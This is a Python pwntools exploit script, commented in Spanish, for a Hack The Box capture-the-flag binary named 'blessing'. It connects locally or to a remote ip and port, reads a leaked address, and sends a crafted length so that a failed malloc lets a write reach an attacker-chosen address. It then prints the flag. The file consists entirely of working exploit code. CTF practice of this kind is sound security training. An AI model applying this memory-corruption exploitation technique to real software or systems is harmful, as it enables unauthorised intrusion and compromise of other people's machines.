#!/usr/bin/python3
import signal
import sys
from pwn import *
from argparse import ArgumentParser
def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

name_program = './blessing'

def exploit(ip,port):
    if ip in ('127.0.0.1', 'localhost'):
        print("[+] Iniciando proceso local")
        r    = process(name_program)
    else:
        print("[+] Iniciando proceso remoto")
        r    = remote(ip, port)

    r.recvuntil(b'this: ') # Filtra flag_trigger. Al forzar malloc=0, la escritura ocurre en (0 + tamaño - 1).
    leak = int(r.recv(14), 16)
    print(f'Leaked address: {leak:#04x}')


    r.sendlineafter(b'length: ', str(leak + 1).encode())
    r.sendlineafter(b'song: ', b'song');

    print(f'\nFlag --> {r.recvline_contains(b"HTB").decode()}\n')

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    parser.add_argument("-p", "--port", help="Puerto del host a analizar")

    args = parser.parse_args()
    exploit(args.ip,args.port)
